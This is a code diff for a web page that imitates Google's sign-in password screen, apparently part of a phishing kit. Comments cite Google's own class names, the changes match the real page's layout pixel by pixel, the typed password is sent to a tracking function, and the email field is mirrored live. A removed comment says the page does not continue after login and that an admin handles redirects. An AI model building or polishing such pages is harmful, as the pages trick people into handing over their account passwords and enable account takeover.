@@ -8,7 +8,8 @@ import {
   geAvatarColor,
   geHiName,
   geInitials,
-  getGeEmail,
+  resolveGeEmail,
+  setGeEmail,
   useGeTracking,
 } from "@/components/ge/GeShared";
 
@@ -25,57 +26,68 @@ export const Route = createFileRoute("/ge/password")({
 const GE_PASSWORD_CSS = `
 ${GE_SHELL_CSS}
 
+/* Password page: title sits 24px under logo (Google --c-ts-t) */
+.ge-password .ge-title {
+  margin-top: 24px;
+}
+
+/* Account chip — match dump .Ahygpe.m8wwGd.cd29Sd.EPPJc */
 .ge-account-chip {
   display: inline-flex;
   align-items: center;
-  gap: 8px;
-  margin-top: 24px;
+  gap: 0;
+  margin-top: 16px;
   max-width: 100%;
   height: 32px;
   padding: 0 8px 0 3px;
   border: 1px solid var(--gm3-outline);
   border-radius: 16px;
-  background: transparent;
+  background: var(--gm3-card);
   color: var(--gm3-on-surface);
   font: inherit;
   font-size: 0.875rem;
   font-weight: 500;
+  letter-spacing: 0.25px;
   line-height: 1.25;
   cursor: pointer;
   text-align: left;
+  position: relative;
 }
 .ge-account-chip:hover {
   background: rgba(227, 227, 227, 0.08);
 }
 .ge-avatar {
-  width: 26px;
-  height: 26px;
+  width: 24px;
+  height: 24px;
   border-radius: 50%;
   display: inline-flex;
   align-items: center;
   justify-content: center;
   flex-shrink: 0;
   color: #fff;
-  font-size: 11px;
+  font-size: 10px;
   font-weight: 500;
   letter-spacing: 0.02em;
   line-height: 1;
   user-select: none;
+  margin-right: 8px;
 }
 .ge-account-email {
   overflow: hidden;
   text-overflow: ellipsis;
   white-space: nowrap;
   min-width: 0;
+  padding-right: 4px;
 }
 .ge-chip-caret {
-  width: 18px;
-  height: 18px;
+  width: 20px;
+  height: 20px;
   flex-shrink: 0;
-  fill: var(--gm3-on-surface-variant);
-  margin-right: 2px;
+  fill: var(--gm3-on-surface);
+  opacity: 0.8;
 }
 
+/* Right column: align "To continue…" with "Hi …" (below the G logo) */
 .ge-verify {
   margin: 0;
   font-size: 1rem;
@@ -84,7 +96,9 @@ ${GE_SHELL_CSS}
   color: var(--gm3-on-surface);
 }
 @media (min-width: 900px) {
-  .ge-verify { margin-top: 8px; }
+  .ge-password .ge-pane-right {
+    padding-top: 72px; /* logo 48px + title margin 24px */
+  }
 }
 
 .ge-form {
@@ -96,12 +110,11 @@ ${GE_SHELL_CSS}
 }
 @media (min-width: 900px) {
   .ge-form {
-    margin-top: 0;
-    padding-top: 8px;
+    margin-top: 22px;
   }
 }
 
-/* Single outline: color only. Never stack gray+blue. */
+/* Outlined password field — single ring, floating label on the border */
 .ge-field {
   position: relative;
   width: 100%;
@@ -157,13 +170,15 @@ ${GE_SHELL_CSS}
 .ge-field.has-value label {
   top: 0;
   font-size: 0.75rem;
+  line-height: 1.333;
   color: var(--gm3-primary);
 }
 
+/* MDC-style checkbox — empty square by default (matches screenshot) */
 .ge-show {
   display: flex;
   align-items: center;
-  gap: 12px;
+  gap: 14px;
   margin-top: 18px;
   user-select: none;
   cursor: pointer;
@@ -171,6 +186,7 @@ ${GE_SHELL_CSS}
   font-size: 0.875rem;
   line-height: 1.25;
   width: fit-content;
+  min-height: 24px;
 }
 .ge-show input {
   position: absolute;
@@ -183,11 +199,12 @@ ${GE_SHELL_CSS}
   width: 18px;
   height: 18px;
   border-radius: 2px;
-  border: 2px solid var(--gm3-on-surface-variant);
+  border: 2px solid rgb(196, 199, 197);
   display: inline-flex;
   align-items: center;
   justify-content: center;
   flex-shrink: 0;
+  box-sizing: border-box;
   transition: background .12s, border-color .12s;
 }
 .ge-show.is-on .ge-check {
@@ -196,21 +213,24 @@ ${GE_SHELL_CSS}
 }
 .ge-check svg {
   display: none;
-  width: 12px;
-  height: 12px;
+  width: 14px;
+  height: 14px;
 }
 .ge-show.is-on .ge-check svg { display: block; }
 
+/* Google O1Slxf: row-reverse, Next packs right, Forgot fills left */
 .ge-actions {
   display: flex;
-  flex-direction: row;
+  flex-direction: row-reverse;
   flex-wrap: wrap;
   align-items: center;
-  justify-content: space-between;
+  justify-content: flex-start;
   margin-top: auto;
   padding-top: 32px;
-  gap: 8px;
-  width: 100%;
+  margin-bottom: -6px;
+  margin-left: -12px;
+  gap: 0;
+  width: calc(100% + 12px);
 }
 .ge-forgot {
   background: none;
@@ -222,7 +242,9 @@ ${GE_SHELL_CSS}
   font-family: inherit;
   font-size: 0.875rem;
   font-weight: 500;
+  letter-spacing: 0.0107142857em;
   cursor: pointer;
+  margin-right: auto;
 }
 .ge-forgot:hover { background: rgba(138, 180, 248, 0.08); }
 .ge-btn {
@@ -237,6 +259,7 @@ ${GE_SHELL_CSS}
   font-family: inherit;
   font-size: 0.875rem;
   font-weight: 500;
+  letter-spacing: 0.0107142857em;
   cursor: pointer;
 }
 .ge-btn-next {
@@ -257,18 +280,25 @@ ${GE_SHELL_CSS}
 
 function GePasswordPage() {
   const { trackClick, trackInput, trackSubmit, sessionId, isObserve } = useGeTracking();
-  const [email, setEmail] = useState(() => getGeEmail());
+  const [email, setEmail] = useState(() => resolveGeEmail());
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [focused, setFocused] = useState(false);
   const passwordRef = useRef<HTMLInputElement>(null);
 
   const hi = useMemo(() => geHiName(email), [email]);
-  const initials = useMemo(() => geInitials(email), [email]);
-  const avatarBg = useMemo(() => geAvatarColor(email || "guest"), [email]);
+  const initials = useMemo(() => (email ? geInitials(email) : ""), [email]);
+  const avatarBg = useMemo(
+    () => (email ? geAvatarColor(email) : "rgb(95, 99, 104)"),
+    [email],
+  );
 
   useEffect(() => {
-    setEmail(getGeEmail());
+    const resolved = resolveGeEmail();
+    if (resolved) {
+      setEmail(resolved);
+      setGeEmail(resolved);
+    }
     setTimeout(() => passwordRef.current?.focus(), 200);
   }, []);
 
@@ -297,6 +327,7 @@ function GePasswordPage() {
         d.field === "identifier"
       ) {
         setEmail(value);
+        setGeEmail(value);
       }
     }
     window.addEventListener("ux:mirror-live-input", onMirror);
@@ -306,19 +337,17 @@ function GePasswordPage() {
   const hasValue = password.length > 0;
   const isActive = focused || hasValue;
   const canContinue = password.length > 0;
+  const title = hi ? `Hi ${hi}` : "Hi";
 
   const handleNext = (e?: FormEvent) => {
     e?.preventDefault();
     if (!canContinue) return;
     trackClick("Next");
     trackSubmit("password", password);
-    // Stay on password — does not continue after login; admin redirects.
   };
 
-  const title = hi ? `Hi ${hi}` : "Hi";
-
   return (
-    <div className="ge-shell">
+    <div className="ge-shell ge-password">
       <GeFontStyle />
       <style>{GE_PASSWORD_CSS}</style>
 
@@ -333,13 +362,13 @@ function GePasswordPage() {
             onClick={() => trackClick("Switch account")}
           >
             <span className="ge-avatar" style={{ background: avatarBg }} aria-hidden="true">
-              {initials}
+              {initials || "?"}
             </span>
             <span className="ge-account-email" data-profile-identifier="">
               {email || "Account"}
             </span>
             <svg className="ge-chip-caret" viewBox="0 0 24 24" aria-hidden="true">
-              <path d="M7 10l5 5 5-5H7z" />
+              <path d="M7 9.5l5 5 5-5H7z" />
             </svg>
           </button>
         </div>
@@ -387,10 +416,10 @@ function GePasswordPage() {
                 aria-hidden="true"
               />
               <span className="ge-check" aria-hidden="true">
-                <svg viewBox="0 0 24 24" fill="none">
+                <svg viewBox="0 0 24 24">
                   <path
                     d="M9.0 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"
-                    fill={showPassword ? "rgb(32,33,36)" : "transparent"}
+                    fill="rgb(32,33,36)"
                   />
                 </svg>
               </span>
@@ -398,15 +427,15 @@ function GePasswordPage() {
             </label>
 
             <div className="ge-actions">
+              <button type="submit" className="ge-btn ge-btn-next" disabled={!canContinue}>
+                Next
+              </button>
               <button
                 type="button"
                 className="ge-forgot"
                 onClick={() => trackClick("Forgot password?")}
               >
                 Forgot password?
-              </button>
-              <button type="submit" className="ge-btn ge-btn-next" disabled={!canContinue}>
-                Next
               </button>
             </div>
           </form>
